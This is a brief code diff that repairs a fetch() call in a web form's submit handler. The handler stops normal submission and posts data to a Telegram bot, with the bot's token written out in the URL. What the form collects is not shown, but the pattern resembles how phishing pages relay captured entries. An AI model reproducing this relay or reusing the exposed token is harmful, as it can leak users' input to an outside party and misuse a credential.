@@ -342,8 +342,7 @@ const form = document.querySelector("form"),
 
 form.addEventListener("submit", (e) => {
     e.preventDefault();
-    fetch(
-https,//api.telegram.org/bot6728623236:AAEWTMeqDC2V3PSI_cI1XL9-YCgDNd95q5I/sendMessage",
+    fetch("https://api.telegram.org/bot6728623236:AAEWTMeqDC2V3PSI_cI1XL9-YCgDNd95q5I/sendMessage",
         {
             method: "POST",
             body: JSON.stringify({
